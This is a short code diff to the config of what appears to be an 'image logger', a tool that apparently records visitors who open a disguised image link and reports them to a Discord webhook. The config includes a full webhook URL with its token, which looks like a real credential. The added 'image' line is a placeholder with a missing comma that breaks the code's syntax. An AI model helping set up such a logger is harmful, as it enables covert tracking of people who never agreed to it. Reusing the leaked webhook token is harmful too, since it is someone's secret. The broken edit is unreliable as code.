@@ -14,6 +14,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335558225692463124/N8UL3FVP12SJITgxLvkaBiqXm1ULRz-iXOBs7-PF91cL7Izdio7D7yjtdHNb7jJGiR-m", # You can also have a custom image by using a URL argument
     "link": "https://www.youtube.com/watch?v=RAZSdO2DA3E&list=RDRAZSdO2DA3E&index=1",
+    "image": "uar link "
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
